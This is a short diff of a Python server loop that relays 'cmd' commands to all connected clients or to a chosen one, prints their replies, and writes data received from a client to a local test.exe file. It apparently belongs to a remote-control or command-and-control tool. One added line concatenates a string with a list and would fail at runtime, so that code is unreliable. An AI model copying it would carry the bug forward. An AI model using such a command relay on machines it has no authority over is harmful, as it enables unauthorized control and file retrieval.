@@ -105,17 +105,18 @@ while True:
     elif command.startswith("cmd"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
+            cleanedCommand = str(commandSplitted[0] + ' ' + ' '.join(commandSplitted[2:]))
             
             if commandSplitted[1] == "all":
                 for client in clients:
-                    receivedData = ReceiveDataFromClient(client, command)
+                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                     print("Received from " + client.info + ":\n" + receivedData.decode());
             else:
                 try:
                     clientNumber = int(commandSplitted[1])
 
                     client = clients[clientNumber]
-                    receivedData = ReceiveDataFromClient(client, command)
+                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                     print("Received from " + client.info + ":\n" + receivedData.decode());
 
                 except ValueError as e:
@@ -128,7 +129,7 @@ while True:
         commandSplitted = command.strip().split(" ")
         client = clients[0]
 
-        receivedData = ReceiveDataFromClient(client, command);
+        receivedData = ReceiveDataFromClient(client, commandSplitted[0] + commandSplitted[2:]);
         f = open("X:\\output\\test.exe", "wb")
         if f:
             print("## Writing to test.exe");
